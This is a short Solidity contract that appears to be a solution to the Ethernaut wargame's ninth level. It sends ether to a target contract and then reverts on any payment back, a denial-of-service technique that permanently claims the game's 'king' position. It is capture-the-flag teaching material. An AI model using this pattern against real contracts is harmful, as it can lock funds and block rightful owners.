// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Ethernaut09 {
    function hack(address _address) public payable {
        (bool check, ) = _address.call{value: msg.value}("");
    }

    fallback() external payable {
        revert();
    }
}